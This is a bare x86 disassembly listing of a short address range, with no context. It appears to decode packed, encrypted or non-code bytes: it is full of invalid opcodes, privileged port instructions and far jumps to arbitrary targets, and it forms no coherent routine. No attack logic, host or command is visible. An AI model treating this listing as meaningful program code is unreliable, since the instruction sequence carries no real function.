  41b46b:	cmp    edi,eax
  41b46d:	scas   eax,DWORD PTR es:[edi]
  41b46e:	loop   0x41b3f0
  41b470:	iret   
  41b471:	dec    esp
  41b472:	in     eax,0x37
  41b474:	sub    al,0xcb
  41b476:	bound  edx,QWORD PTR ds:[edi]
  41b479:	cs sahf 
  41b47b:	(bad)  
  41b47c:	sbb    eax,DWORD PTR [edi*8-0x2335038b]
  41b483:	push   ds
  41b484:	xor    DWORD PTR [edx],0x32
  41b487:	mov    edx,0xce6939a8
  41b48c:	cdq    
  41b48d:	mov    dl,0x4f
  41b48f:	paddusw mm3,QWORD PTR [edx+0x75cb7e65]
  41b496:	in     al,dx
  41b497:	out    0x53,al
  41b499:	cmp    al,0xfc
  41b49b:	setge  BYTE PTR [eax]
  41b49e:	mov    esp,0x93f59f48
  41b4a3:	and    dh,BYTE PTR [edi-0x14]
  41b4a6:	loope  0x41b475
  41b4a8:	push   0x66693993
  41b4ad:	stc    
  41b4ae:	repz jae 0x41b51e
  41b4b1:	jbe    0x41b4ce
  41b4b3:	xlat   BYTE PTR ds:[ebx]
  41b4b4:	adc    al,0x65
  41b4b6:	jo     0x41b492
  41b4b8:	cmp    dl,BYTE PTR [ebp-0x7b]
  41b4bb:	jmp    0x746e:0x155ed18a
  41b4c2:	sbb    BYTE PTR ds:[eax+0x6d],dl
  41b4c6:	mov    al,ds:0x9d37c91a
  41b4cb:	cwde   
  41b4cc:	mov    cl,0x95
  41b4ce:	sbb    DWORD PTR [ecx],esp
  41b4d0:	not    BYTE PTR [edi]
  41b4d2:	or     al,0xd3
  41b4d4:	call   0x1f77:0x1557a6fb
  41b4db:	pop    ecx
  41b4dc:	loopne 0x41b521
  41b4de:	(bad)  
  41b4df:	adc    eax,0x9594a662
  41b4e4:	xchg   esi,eax
  41b4e5:	add    al,0xf0
  41b4e7:	cmc    
  41b4e8:	xchg   edi,eax
  41b4e9:	int    0x82
  41b4eb:	lahf   
  41b4ec:	mov    ds:0x7ee97dfa,al
  41b4f1:	inc    ebp
  41b4f2:	push   eax
  41b4f3:	and    BYTE PTR [ebx],bh
  41b4f5:	icebp  
  41b4f6:	pop    esi
  41b4f7:	sbb    eax,0xc38d036a
  41b4fc:	push   esi
  41b4fd:	ss adc al,0xf8
  41b500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b501:	inc    eax
  41b502:	jnp    0x41b544
  41b504:	xchg   ecx,eax
  41b505:	call   0x4b2cd8a6
  41b50a:	dec    ebp
  41b50b:	pop    esi
  41b50c:	into   
  41b50d:	mov    gs,esi
  41b50f:	xchg   ecx,eax
  41b510:	sti    
  41b511:	dec    ebp
  41b512:	pop    ds
  41b513:	xor    al,BYTE PTR ds:0xdb63baa6
  41b519:	pusha  
  41b51a:	into   
  41b51b:	sbb    BYTE PTR [eax-0x25],0x6e
  41b51f:	pushf  
  41b520:	jle    0x41b565
  41b522:	ins    BYTE PTR es:[edi],dx
  41b523:	repnz push esp
  41b525:	push   edx
  41b526:	cmc    
  41b527:	sti    
  41b528:	iret   
  41b529:	push   edi
  41b52a:	dec    DWORD PTR [ebx+edx*2+0x72]
  41b52e:	fucomp st(6)
  41b530:	lods   eax,DWORD PTR ds:[esi]
  41b531:	clc    
  41b532:	adc    BYTE PTR [esi-0x78edc740],0xf9
  41b539:	xor    ah,bl
  41b53b:	ins    DWORD PTR es:[edi],dx
  41b53c:	inc    eax
  41b53d:	jg     0x41b59e
  41b53f:	jmp    0x41b5a5
  41b541:	xchg   ebx,eax
  41b542:	pop    ebp
  41b543:	cld    
  41b544:	mov    DWORD PTR [esi+0x35bd3f3],edx
  41b54a:	daa    
  41b54b:	sub    ebx,DWORD PTR [edi-0x4d2145a8]
  41b551:	pop    es
  41b552:	out    dx,eax
  41b553:	push   0x29
  41b555:	nop
  41b556:	jbe    0x41b50c
  41b558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b559:	push   ebp
  41b55a:	(bad)  
  41b55b:	enter  0x121f,0x82
  41b55f:	jl     0x41b57a
  41b561:	mov    ebp,0xf8264c99
  41b566:	and    dh,BYTE PTR [ecx+0x44]
  41b569:	mov    dl,0x16
  41b56b:	push   es
  41b56c:	in     al,dx
  41b56d:	call   0x71b7a86d
  41b572:	or     eax,0x254a9d17
  41b577:	mov    bl,0x94
  41b579:	push   ebp
  41b57a:	dec    edx
  41b57b:	das    
  41b57c:	ret    
  41b57d:	jbe    0x41b520
  41b57f:	out    dx,eax
  41b580:	dec    esi
  41b581:	xchg   ecx,eax
  41b582:	jmp    0x41b585
  41b584:	add    DWORD PTR [esp+edx*1],edx
  41b587:	inc    DWORD PTR [ecx-0x6fc6dce9]
  41b58d:	loop   0x41b5de
  41b58f:	push   ebp
  41b590:	pop    eax
  41b591:	ret    
  41b592:	ret    
  41b593:	inc    ecx
  41b594:	pop    edx
  41b595:	xchg   ebp,eax
  41b596:	sti    
  41b597:	dec    esi
  41b598:	xor    ch,al
  41b59a:	cdq    
  41b59b:	cmp    al,0x5f
  41b59d:	pop    ecx
  41b59e:	jno    0x41b5d7
  41b5a0:	popf   
  41b5a1:	jmp    DWORD PTR [edx-0x54a398cb]
  41b5a7:	pop    es
  41b5a8:	mov    dl,0x56
  41b5aa:	(bad)  
  41b5ab:	call   FWORD PTR [ecx+0x942e4fe]
  41b5b1:	cmp    al,0x1f
  41b5b3:	and    BYTE PTR [eax-0x11],cl
  41b5b6:	adc    eax,0x5a13a651
  41b5bb:	xor    DWORD PTR [esi],ecx
  41b5bd:	mov    al,0x2a
  41b5bf:	dec    eax
  41b5c0:	jnp    0x41b559
  41b5c2:	mov    al,ds:0x2ca9cf98
  41b5c7:	add    edi,DWORD PTR [esi]
  41b5c9:	das    
  41b5ca:	mov    esi,0xd87d5800
  41b5cf:	ret    
  41b5d0:	int    0xb7
  41b5d2:	xlat   BYTE PTR ds:[ebx]
  41b5d3:	repz inc ebx
  41b5d5:	mov    gs,WORD PTR [edi]
  41b5d7:	loopne 0x41b5f4
  41b5d9:	adc    edx,eax
  41b5db:	ins    BYTE PTR es:[edi],dx
  41b5dc:	sub    eax,0xb5786ac9
  41b5e1:	mov    al,0x3d
  41b5e3:	sub    bl,BYTE PTR [eax]
  41b5e5:	pop    ds
  41b5e6:	dec    ebp
  41b5e7:	jg     0x41b58b
  41b5e9:	add    al,BYTE PTR [edx]
  41b5eb:	or     bh,BYTE PTR [edi-0x340b0fd6]
  41b5f1:	cmp    BYTE PTR [ebx],bh
  41b5f3:	sti    
  41b5f4:	mov    BYTE PTR [ecx+0x73],bh
  41b5f7:	jmp    0x41b608
  41b5f9:	sub    BYTE PTR [edx+0x49],0x89
  41b5fd:	into   
  41b5fe:	cdq    
  41b5ff:	mov    bl,0xff
  41b601:	sbb    eax,0xa35a358b
  41b606:	sub    BYTE PTR [eax],dh
  41b608:	cmp    al,0xe5
  41b60a:	mov    ds:0xbee3a2a9,al
  41b60f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b610:	scas   al,BYTE PTR es:[edi]
  41b611:	or     BYTE PTR [ecx+edi*4],bh
  41b614:	out    0x10,eax
  41b616:	outs   dx,BYTE PTR ds:[esi]
  41b617:	rcl    BYTE PTR [ecx],0x9c
  41b61a:	retf   
  41b61b:	loopne 0x41b676
  41b61d:	sbb    ah,dh
  41b61f:	dec    ecx
  41b620:	mov    BYTE PTR ds:0xc6e2d173,bl
  41b626:	add    edi,DWORD PTR [ebp+0x1f406160]
  41b62c:	or     dh,BYTE PTR [ebx]
  41b62e:	mov    esp,0xa8b969da
  41b633:	(bad)  
  41b634:	fwait
  41b635:	imul   esp,esi,0x139cc2f1
  41b63b:	adc    DWORD PTR [edi+edi*4],edx
  41b63e:	inc    DWORD PTR [ecx]
  41b640:	inc    ecx
  41b641:	mov    ?,WORD PTR [esi]
  41b643:	aam    0xd2
  41b645:	jmp    0xaff5d53d
  41b64a:	jb     0x41b6c0
  41b64c:	adc    al,0xd6
  41b64e:	pop    ss
  41b64f:	and    DWORD PTR [ebx+0x58fa6600],ebp
  41b655:	sub    edx,eax
  41b657:	rol    DWORD PTR fs:[ecx+0x596ebe2c],0x29
  41b65f:	inc    ecx
  41b660:	aaa    
  41b661:	jle    0x41b689
  41b663:	sub    DWORD PTR [eax-0xb23af2b],edi
  41b669:	add    eax,0x46c4898c
  41b66e:	jbe    0x41b621
  41b670:	call   edi
  41b672:	xor    eax,0x6f8bb44
  41b677:	inc    esi
  41b678:	push   esi
  41b679:	mov    ds:0x404018ea,eax
  41b67e:	and    DWORD PTR [edi-0x6cdd48ec],eax
  41b684:	mov    dl,0x3b
  41b686:	mov    eax,0xdac75400
  41b68b:	push   ebp
  41b68c:	retf   0xaac
  41b68f:	xor    DWORD PTR [esi+0x608594d],0x58
  41b696:	cs into 
  41b698:	test   ah,ch
  41b69a:	scas   eax,DWORD PTR es:[edi]
  41b69b:	in     al,0xc7
  41b69d:	fistp  DWORD PTR [ecx+ebx*1+0x69]
  41b6a1:	xchg   ebx,eax
  41b6a2:	push   es
  41b6a3:	test   DWORD PTR [ebx-0x4a0a0a00],ebp
  41b6a9:	jbe    0x41b6da
  41b6ab:	mov    al,al
  41b6ad:	cmc    
  41b6ae:	add    DWORD PTR [edi+0x7f],esp
  41b6b1:	pop    eax
  41b6b2:	inc    esi
  41b6b3:	leave  
  41b6b4:	mul    BYTE PTR [esp+ebx*8-0x53]
  41b6b8:	add    DWORD PTR [eax+0x38],eax
  41b6bb:	mov    esp,0x7ea46188
  41b6c0:	(bad)  
  41b6c1:	retf   0xdfb6
  41b6c4:	loop   0x41b69a
  41b6c6:	daa    
  41b6c7:	stc    
  41b6c8:	lods   al,BYTE PTR ds:[esi]
  41b6c9:	pop    ds
  41b6ca:	int3   
  41b6cb:	dec    esp
  41b6cc:	ret    0xdc34
  41b6cf:	fcmovnu st,st(1)
  41b6d1:	pop    esp
  41b6d2:	out    0xe4,al
  41b6d4:	scas   al,BYTE PTR es:[edi]
  41b6d5:	arpl   WORD PTR [edi+eax*1],ax
  41b6d8:	adc    esp,0x4a
  41b6db:	ss mov edi,0xbb4312a6
  41b6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e2:	xchg   edx,eax
  41b6e3:	cmp    esp,DWORD PTR [edx+0x3c]
  41b6e6:	loop   0x41b765
  41b6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e9:	pop    ebp
  41b6ea:	mov    WORD PTR [eax],ss
  41b6ec:	sub    edx,DWORD PTR [eax+edi*4+0x197b73d5]
  41b6f3:	ja     0x41b696
  41b6f5:	imul   ecx,DWORD PTR [eax+0x4b],0x2543302f
  41b6fc:	sub    al,0xd3
  41b6fe:	in     eax,0xfb
  41b700:	jbe    0x41b6bd
  41b702:	gs mov edx,0xe6bbf52c
  41b708:	or     ebp,edi
  41b70a:	cmp    al,0xb9
  41b70c:	and    DWORD PTR [ecx+ecx*4+0x25],0x4ad64c77
  41b714:	dec    ecx
  41b715:	or     DWORD PTR [eax+0x7e6e06f5],esp
  41b71b:	xor    al,0xfd
  41b71d:	inc    ebp
  41b71e:	into   
  41b71f:	das    
  41b720:	dec    eax
  41b721:	aaa    
  41b722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b723:	mov    ebx,0x17136e12
  41b728:	sahf   
  41b729:	outs   dx,BYTE PTR ds:[esi]
  41b72a:	dec    ebp
  41b72b:	mov    eax,0x5a1e8c70
  41b730:	jne    0x41b782
  41b732:	stos   BYTE PTR es:[edi],al
  41b733:	pop    ecx
  41b734:	leave  
  41b735:	push   esp
  41b736:	jae    0x41b7ab
  41b738:	lahf   
  41b739:	call   0x9ba0f9cd
  41b73e:	sub    bl,BYTE PTR [eax+eax*1+0x3d]
  41b742:	xchg   edx,eax
  41b743:	lods   al,BYTE PTR ds:[esi]
  41b744:	jne    0x41b77d
  41b746:	aad    0x6a
  41b748:	(bad)  
  41b749:	xor    dl,BYTE PTR [esi-0x4efd69b9]
  41b74f:	sbb    BYTE PTR [eax-0x421b7ab0],0x8f
  41b756:	jmp    0xc870:0xd6d7e829
  41b75d:	cmp    DWORD PTR [eax+edx*1+0x4ea1b5ea],esp
  41b764:	and    al,0xa1
  41b766:	cvttps2pi mm4,QWORD PTR [ebp+0x67852ded]
  41b76d:	push   es
  41b76e:	jecxz  0x41b7d2
  41b770:	and    BYTE PTR [edi+ebx*2],dh
  41b773:	inc    edx
  41b774:	pop    ecx
  41b775:	aas    
  41b776:	aas    
  41b777:	popa   
  41b778:	sub    eax,0x468d3494
  41b77d:	and    cl,BYTE PTR [eax]
  41b77f:	sbb    al,0x79
  41b781:	sub    eax,0x5d598281
  41b786:	(bad)  
  41b787:	sbb    esp,esi
  41b789:	ret    0xe18
  41b78c:	adc    ebp,DWORD PTR [edi]
  41b78e:	dec    ebp
  41b78f:	aas    
  41b790:	jbe    0x41b7aa
  41b792:	in     eax,0xd1
  41b794:	sbb    bl,0x37
  41b797:	sub    ah,BYTE PTR [eax+eax*4+0x7bc3c9c7]
  41b79e:	mov    WORD PTR [edi+ebp*1],cs
  41b7a1:	pop    ecx
  41b7a2:	out    dx,al
  41b7a3:	mov    al,0x3b
  41b7a5:	adc    BYTE PTR [eax+0x6c4afe50],0xe4
  41b7ac:	push   ds
  41b7ad:	xor    ebp,ebx
  41b7af:	add    eax,0x6148a6f2
  41b7b4:	pop    edi
  41b7b5:	push   0xffffffee
  41b7b7:	inc    edi
  41b7b8:	jge    0x41b7b3
  41b7ba:	pop    edi
  41b7bb:	sbb    DWORD PTR [edx+edi*1-0x687e20e8],edi
  41b7c2:	mov    BYTE PTR [ebx+0x42eea9b2],bl
  41b7c8:	cmp    cl,BYTE PTR [ebx]
  41b7ca:	sub    ah,BYTE PTR ds:0x917d8a0c
  41b7d0:	je     0x41b809
  41b7d2:	into   
  41b7d3:	mov    ecx,0xf4d99ad1
  41b7d8:	or     esi,edi
  41b7da:	stos   DWORD PTR es:[edi],eax
  41b7db:	jl     0x41b805
  41b7dd:	mov    ebp,0x8683f757
  41b7e2:	shr    BYTE PTR [ecx*1-0x74e93de8],cl
  41b7e9:	adc    eax,0x8bd374c
  41b7ee:	cmp    ebx,DWORD PTR [esi-0x60]
  41b7f1:	push   cs
  41b7f2:	sbb    BYTE PTR [eax],0xec
  41b7f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f6:	push   ebx
  41b7f7:	xor    BYTE PTR [esi],dl
  41b7f9:	mov    eax,ds:0xb219755
  41b7fe:	data16 out dx,al
  41b800:	clc    
  41b801:	clc    
  41b802:	xchg   ecx,eax
  41b803:	test   BYTE PTR [edx],bl
  41b805:	inc    esp
  41b806:	pop    esp
  41b807:	xchg   BYTE PTR [edx+0x5fe5f693],al
  41b80d:	add    DWORD PTR [ecx-0xfa846],ebx
  41b813:	rcr    BYTE PTR ds:[edi],1
  41b816:	ja     0x41b7be
  41b818:	dec    edx
  41b819:	cmc    
  41b81a:	sbb    esi,0x15
  41b81d:	pop    ebp
  41b81e:	out    dx,eax
  41b81f:	stc    
  41b820:	js     0x41b856
  41b822:	dec    ebx
  41b823:	ficom  WORD PTR [edx]
  41b825:	cmp    BYTE PTR ds:0x9edaa4b8,ah
  41b82b:	out    dx,eax
  41b82c:	sbb    ecx,DWORD PTR [ebx+ebp*2+0x2ee9d2e3]
  41b833:	push   0x8a333d50
  41b838:	mov    edi,0xda78cb3
  41b83d:	adc    ch,BYTE PTR [eax]
  41b83f:	ins    DWORD PTR es:[edi],dx
  41b840:	je     0x41b806
  41b842:	aas    
  41b843:	out    0x34,al
  41b845:	retf   0xa3e2
  41b848:	cmp    bl,BYTE PTR [edx-0x430f96b0]
  41b84e:	mov    dh,0xe
  41b850:	or     ch,dh
  41b852:	add    eax,0xf15f7446
  41b857:	lods   al,BYTE PTR ds:[esi]
  41b858:	retf   
  41b859:	mov    esi,0x36e93e04
  41b85e:	out    dx,al
  41b85f:	shl    BYTE PTR [edx+esi*4+0x5c72b19e],0x34
  41b867:	ins    BYTE PTR es:[edi],dx
  41b868:	dec    ebx
  41b869:	add    BYTE PTR [edx-0xe982b2d],ah
  41b86f:	mov    ebp,DWORD PTR [ebx]
  41b871:	push   ebx
  41b872:	ficomp DWORD PTR [ecx+0x1d]
  41b875:	lea    eax,[ebp-0x6f7f61db]
  41b87b:	mov    esp,0x1833e65
  41b880:	jae    0x41b8d6
  41b882:	sti    
  41b883:	(bad)  
  41b884:	out    0xb0,al
  41b886:	inc    ebx
  41b887:	adc    al,0xc9
  41b889:	(bad)  
  41b88a:	mov    cx,0xe49f
  41b88e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b88f:	mov    edx,0xe7374005
  41b894:	jo     0x41b8a5
  41b896:	jnp    0x41b889
  41b898:	add    eax,0xdff8cefc
  41b89d:	inc    esi
  41b89e:	push   ss
  41b89f:	jmp    0xbe9:0x5e6317b2
  41b8a6:	adc    dh,ch
  41b8a8:	mov    cl,0x54
  41b8aa:	pushf  
  41b8ab:	jb     0x41b923
  41b8ad:	fldcw  WORD PTR [ecx-0x1d]
  41b8b0:	mov    ds:0x442a5c89,eax
  41b8b5:	dec    ebp
  41b8b6:	xor    eax,0xcc670ac
  41b8bb:	(bad)  
  41b8bc:	aam    0x7a
  41b8be:	sbb    al,0x6b
  41b8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c1:	mov    ax,ds:0xce8c965a
  41b8c7:	fs jno 0x41b92d
  41b8ca:	or     BYTE PTR [esi-0x57],dl
  41b8cd:	mov    al,ds:0x60cb74e
  41b8d2:	jp     0x41b94b
  41b8d4:	lea    ebp,[esi-0xf]
  41b8d7:	into   
  41b8d8:	inc    edi
  41b8d9:	mov    dh,0x52
  41b8db:	lods   eax,DWORD PTR ds:[esi]
  41b8dc:	in     eax,dx
  41b8dd:	test   al,0x86
  41b8df:	icebp  
  41b8e0:	fstp   QWORD PTR [ebx+0x1e]
  41b8e3:	xchg   edi,eax
  41b8e4:	jns    0x41b8bf
  41b8e6:	or     BYTE PTR ds:0xf49fa9be,dl
  41b8ec:	loop   0x41b956
  41b8ee:	aam    0xf7
  41b8f0:	inc    ebp
  41b8f1:	dec    edx
  41b8f2:	outs   dx,DWORD PTR ds:[esi]
  41b8f3:	stos   DWORD PTR es:[edi],eax
  41b8f4:	ficomp WORD PTR [ecx-0x12]
  41b8f7:	test   BYTE PTR [ecx-0x484f5180],dh
  41b8fd:	scas   al,BYTE PTR es:[edi]
  41b8fe:	repnz nop
  41b900:	push   ds
  41b901:	push   cs
  41b902:	pop    ss
  41b903:	fidiv  DWORD PTR ds:0x3ba0340a
  41b909:	jbe    0x41b90f
  41b90b:	test   BYTE PTR [esp+eiz*8-0x6d968149],0x73
  41b913:	fild   QWORD PTR [edx]
  41b915:	mov    edx,0x55dc5c78
  41b91a:	mov    ah,0xd0
  41b91c:	aam    0x46
  41b91e:	dec    edi
  41b91f:	mov    WORD PTR [eax-0x4e],es
  41b922:	je     0x41b8f7
  41b924:	sbb    edi,ebx
  41b926:	jl     0x41b999
  41b928:	xor    ebp,esp
  41b92a:	push   edi
  41b92b:	xor    DWORD PTR [edx-0x3c],esp
  41b92e:	fisttp WORD PTR [ebx+eax*1]
  41b931:	into   
  41b932:	mov    BYTE PTR [eax+0x18],ah
  41b935:	jnp    0x41b8e4
  41b937:	adc    eax,0xb989bcaf
  41b93c:	rol    BYTE PTR [esi+ecx*4],cl
  41b93f:	mov    al,ds:0xd622d728
  41b944:	push   esi
  41b945:	cld    
  41b946:	nop
  41b947:	mov    al,0x50
  41b949:	mov    bh,0x81
  41b94b:	std    
  41b94c:	mov    DWORD PTR [ebx-0x5d],ebp
  41b94f:	xchg   ebp,eax
  41b950:	adc    BYTE PTR [ebx+edi*2+0xc],dh
  41b954:	sahf   
  41b955:	das    
  41b956:	mov    ch,0x5b
  41b958:	inc    esi
  41b959:	adc    al,0x95
  41b95b:	jmp    0x7df11805
  41b960:	ins    DWORD PTR es:[edi],dx
  41b961:	scas   al,BYTE PTR es:[edi]
  41b962:	jbe    0x41b9a5
  41b964:	out    dx,eax
  41b965:	int    0x12
  41b967:	mov    ah,cl
  41b969:	pop    ds
  41b96a:	xlat   BYTE PTR ds:[ebx]
  41b96b:	scas   eax,DWORD PTR es:[edi]
  41b96c:	cli    
  41b96d:	sub    edi,DWORD PTR [ebx+0x16]
  41b970:	mov    ebp,0xfe2a15b9
  41b975:	test   DWORD PTR [eax],edx
  41b977:	out    dx,al
  41b978:	sti    
  41b979:	lods   al,BYTE PTR ds:[esi]
  41b97a:	pop    esi
  41b97b:	xchg   esp,eax
  41b97c:	daa    
  41b97d:	mov    edi,0xd598a022
  41b982:	add    dh,bl
  41b984:	mov    ebp,0x15e68a4d
  41b989:	sbb    eax,0x8fe4569f
  41b98e:	xchg   esi,eax
  41b98f:	pop    ss
  41b990:	cmp    eax,esi
  41b992:	ins    DWORD PTR es:[edi],dx
  41b993:	sub    DWORD PTR [ecx],ebp
  41b995:	dec    esp
  41b996:	xchg   esp,eax
  41b997:	or     edi,0x8c630923
  41b99d:	nop
  41b99e:	lea    ecx,[ebp-0x1467b5c9]
  41b9a4:	xchg   esp,eax
  41b9a5:	sub    al,ch
  41b9a7:	adc    ch,BYTE PTR [ecx]
  41b9a9:	adc    al,0xfa
  41b9ab:	leave  
  41b9ac:	shl    BYTE PTR ds:0x85d3dd2a,0xc6
  41b9b3:	push   ds
  41b9b4:	sar    BYTE PTR [ebx+eiz*8+0x73d2116b],cl
  41b9bb:	mov    esp,DWORD PTR [ebx]
  41b9bd:	mov    bl,0xc0
  41b9bf:	mov    ecx,0xcbedc16a
  41b9c4:	push   ecx
  41b9c5:	pusha  
  41b9c6:	cmp    ecx,DWORD PTR [edi+0x4c]
  41b9c9:	and    DWORD PTR [edi],ebp
  41b9cb:	xor    ebp,DWORD PTR [ebp-0x29]
  41b9ce:	push   edi
  41b9cf:	(bad)  
  41b9d0:	pop    edi
  41b9d1:	adc    al,0x64
  41b9d3:	repz xchg bh,ah
  41b9d6:	and    BYTE PTR [edx-0x1c19c90b],ah
  41b9dc:	jmp    0xefad8c32
  41b9e1:	xor    bh,dl
  41b9e3:	movaps XMMWORD PTR [esi],xmm4
  41b9e6:	inc    esp
  41b9e7:	pop    esp
  41b9e8:	mov    eax,0x462d095
  41b9ed:	mov    eax,ds:0x30db9b02
  41b9f2:	dec    edx
  41b9f3:	inc    edi
  41b9f4:	push   ebx
  41b9f5:	mov    edx,0x7fd719e8
  41b9fa:	popa   
  41b9fb:	and    eax,0x6f6bc4df
  41ba00:	push   DWORD PTR [ebx-0x69c3fbdd]
  41ba06:	loope  0x41b99f
  41ba08:	aaa    
  41ba09:	mov    al,ds:0x4c238f91
  41ba0e:	iret   
  41ba0f:	mov    dl,BYTE PTR [ebx]
  41ba11:	jno    0x41b9a5
  41ba13:	addr16 dec esp
  41ba15:	cmp    BYTE PTR [ebx-0x7e46b890],dl
  41ba1b:	nop
  41ba1c:	test   eax,0x64b93a94
  41ba21:	outs   dx,DWORD PTR ds:[esi]
  41ba22:	dec    esi
  41ba23:	jnp    0x41b9e6
  41ba25:	mov    DWORD PTR [edx+0x2a744d94],0xd86d5acd
  41ba2f:	jl     0x41ba14
  41ba31:	stos   DWORD PTR es:[edi],eax
  41ba32:	and    eax,0x2e4520cf
  41ba37:	xchg   ebp,eax
  41ba38:	fwait
  41ba39:	lds    edx,FWORD PTR [edx-0x76e054ca]
  41ba3f:	sub    cl,BYTE PTR [ebx-0x6e]
  41ba42:	and    eax,0x631be29a
  41ba47:	in     eax,dx
  41ba48:	sub    al,0xf5
  41ba4a:	stos   BYTE PTR es:[edi],al
  41ba4b:	push   cs
  41ba4c:	cmp    ebp,DWORD PTR [ecx+esi*1+0x75]
  41ba50:	adc    al,0x88
  41ba52:	mov    edx,0xbf773fe8
  41ba57:	in     al,0xc1
  41ba59:	mov    bh,0x4e
  41ba5b:	fidiv  WORD PTR [esi+ebx*8+0x1581bd9a]
  41ba62:	jmp    0x464:0x38ba3997
  41ba69:	fild   DWORD PTR [edi+0x3e0edea0]
  41ba6f:	pop    esp
  41ba70:	jno    0x41ba92
  41ba72:	lods   al,BYTE PTR ds:[esi]
  41ba73:	jp     0x41ba2e
  41ba75:	repnz shl DWORD PTR [edi],0x5c
  41ba79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba7a:	imul   ecx,DWORD PTR ds:0x727d272,0xd3969d30
  41ba84:	retf   
  41ba85:	jns    0x41bae1
  41ba87:	mov    edx,0x10873da8
  41ba8c:	adc    DWORD PTR [ecx-0x749d2722],eax
  41ba92:	sub    edx,ecx
  41ba94:	mov    ds:0xf602d8c6,eax
  41ba99:	inc    eax
  41ba9a:	add    BYTE PTR [ebp-0x140ca7cf],bl
  41baa0:	rcr    BYTE PTR ss:[esi-0x3a],0xa7
  41baa5:	lahf   
  41baa6:	test   BYTE PTR [edi+0x2b1e028d],al
  41baac:	in     al,0x78
  41baae:	mov    al,0x79
  41bab0:	xchg   ecx,eax
  41bab1:	add    al,0x99
  41bab3:	sar    DWORD PTR [esi],0x16
  41bab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab7:	jecxz  0x41bafa
  41bab9:	sbb    dl,BYTE PTR [ebx-0x2b13b692]
  41babf:	push   0x6b015ecd
  41bac4:	stos   BYTE PTR es:[edi],al
  41bac5:	aas    
  41bac6:	push   eax
  41bac7:	call   0x12f98388
  41bacc:	div    DWORD PTR [ecx-0x2]
  41bacf:	add    al,0x3e
  41bad1:	cmp    al,0xf6
  41bad3:	mov    ch,0x3b
  41bad5:	mov    esi,0xc97c65a7
  41bada:	jmp    0xf9e09ca6
  41badf:	outs   dx,BYTE PTR ds:[esi]
  41bae0:	adc    DWORD PTR [esi-0x13],0x49e0922f
  41bae7:	adc    ch,BYTE PTR [ebx-0x2d6e5d9e]
  41baed:	popa   
  41baee:	sub    al,BYTE PTR [ebp-0x4d]
  41baf1:	xchg   DWORD PTR [ecx-0x71f559b8],ebp
  41baf7:	(bad)  
  41baf8:	in     eax,0x1e
  41bafa:	data16 es and al,dl
  41bafe:	sbb    al,0xaf
  41bb00:	or     BYTE PTR [ebx-0x1c],ch
  41bb03:	cmp    eax,0x3bbcbb45
  41bb08:	dec    ebp
  41bb09:	fcom   DWORD PTR [edi]
  41bb0b:	sahf   
  41bb0c:	outs   dx,DWORD PTR ds:[esi]
  41bb0d:	or     ch,BYTE PTR [ecx-0x56a0e9f1]
  41bb13:	mov    WORD PTR [ebx],ss
  41bb15:	mov    ds:0x2a24f799,al
  41bb1a:	cmp    BYTE PTR [esi],dl
  41bb1c:	mov    cl,0x31
  41bb1e:	clc    
  41bb1f:	fist   WORD PTR [ebx+ecx*2]
  41bb22:	add    eax,0x1827c5b
  41bb27:	sub    BYTE PTR [ecx+eax*1+0x18381aa7],0x23
  41bb2f:	and    edx,DWORD PTR [esi]
  41bb31:	into   
  41bb32:	mov    dl,0x30
  41bb34:	cli    
  41bb35:	dec    esi
  41bb36:	dec    edi
  41bb37:	test   BYTE PTR [ecx-0x735ddf55],dl
  41bb3d:	pop    ebp
  41bb3e:	cmp    DWORD PTR [ebx],0x8c8c852f
  41bb44:	jmp    0x4f4b:0x169b7ec5
  41bb4b:	fsub   DWORD PTR [edi+0x7ca7472]
  41bb51:	ins    DWORD PTR es:[edi],dx
  41bb52:	jmp    0xadb1:0x2288ea3
  41bb59:	push   edi
  41bb5a:	sub    esp,edi
  41bb5c:	xor    DWORD PTR [ecx+ebp*2-0x1a],esi
  41bb60:	mov    ebp,0x50e955cf
  41bb65:	cmp    BYTE PTR [ebp+0xa12442d],cl
  41bb6b:	jae    0x41bbaa
  41bb6d:	sbb    al,0x67
  41bb6f:	pushf  
  41bb70:	cld    
  41bb71:	mov    gs,WORD PTR [ebx-0x72]
  41bb74:	xchg   BYTE PTR [esi+0x2d],ch
  41bb77:	imul   eax,DWORD PTR [ebx],0x61
  41bb7a:	xchg   edx,ebx
  41bb7c:	aas    
  41bb7d:	cs das 
  41bb7f:	cmp    DWORD PTR [eax+0x62cd92],ecx
  41bb85:	cwde   
  41bb86:	xor    al,0x3
  41bb88:	cli    
  41bb89:	out    dx,al
  41bb8a:	cmp    ebx,edi
  41bb8c:	outs   dx,DWORD PTR ds:[esi]
  41bb8d:	xchg   edx,eax
  41bb8e:	or     BYTE PTR [eax-0x36],al
  41bb91:	jp     0x41bbca
  41bb93:	bound  edi,QWORD PTR [ecx]
  41bb95:	sub    al,0xa7
  41bb97:	imul   edi,esi,0x1e7b6446
  41bb9d:	pop    ss
  41bb9e:	enter  0x83ec,0x50
  41bba2:	inc    esp
  41bba3:	cld    
  41bba4:	fadd   DWORD PTR [ecx]
  41bba6:	jno    0x41bb3b
  41bba8:	dec    eax
  41bba9:	fstp   DWORD PTR [ecx-0x17]
  41bbac:	iret   
  41bbad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbae:	mov    dh,0xc7
  41bbb0:	lds    esi,FWORD PTR [esi+0x7e6726b6]
  41bbb6:	mov    BYTE PTR [edx-0x2fed394b],ah
  41bbbc:	lea    edi,[ecx-0xd]
  41bbbf:	xor    al,0xe5
  41bbc1:	ds mov edx,0x2fe79fa9
  41bbc7:	mov    bh,0xfb
  41bbc9:	mov    ss,WORD PTR [edx+0x1e]
  41bbcc:	sub    eax,0x3eef2933
  41bbd1:	rol    ah,cl
  41bbd3:	dec    ebx
  41bbd4:	jmp    0xf8398615
  41bbd9:	test   DWORD PTR [ecx],eax
  41bbdb:	sub    al,0x6f
  41bbdd:	sub    dh,BYTE PTR [eax+0x71]
